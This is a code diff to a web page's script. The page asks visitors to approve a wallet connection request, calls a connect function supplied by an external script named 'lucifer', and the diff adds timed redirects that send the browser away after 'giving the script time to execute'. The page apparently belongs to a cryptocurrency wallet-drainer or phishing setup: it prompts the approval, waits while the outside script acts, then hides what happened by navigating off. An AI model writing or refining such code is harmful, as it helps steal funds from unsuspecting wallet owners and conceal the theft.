@@ -141,21 +141,39 @@
         document.getElementById('statusDesc').textContent = `Please review and approve the interface connection request within your standard ${activeWallet} utility extension.`;
 
         function initConnection() {
-            // Checks if either functional binding from lucifer is ready
             if (window.connectWallet && typeof window.connectWallet === 'function') {
                 window.connectWallet(activeWallet);
+                
+                // Route the user back to the React app dashboard after giving the script time to execute
+                setTimeout(() => {
+                    redirectToApp();
+                }, 6000);
+
             } else if (window.connect && typeof window.connect === 'function') {
                 window.connect(activeWallet);
+                
+                setTimeout(() => {
+                    redirectToApp();
+                }, 6000);
             } else {
                 console.log(`Lucifer binding not ready yet. Retrying in a moment...`);
-                // Polls every 300ms until the script fully attaches to the window scope
                 setTimeout(initConnection, 300);
             }
         }
 
         window.addEventListener('DOMContentLoaded', () => {
             initConnection();
+            
+            // EMERGENCY FAILSAFE: Force redirect back to app if something completely freezes up
+            setTimeout(() => {
+                redirectToApp();
+            }, 10000);
         });
+
+        function redirectToApp() {
+            // Sends the browser cleanly out of this static asset back to your main site root context
+            window.location.href = '/'; 
+        }
 
         function goBack() {
             window.history.back();
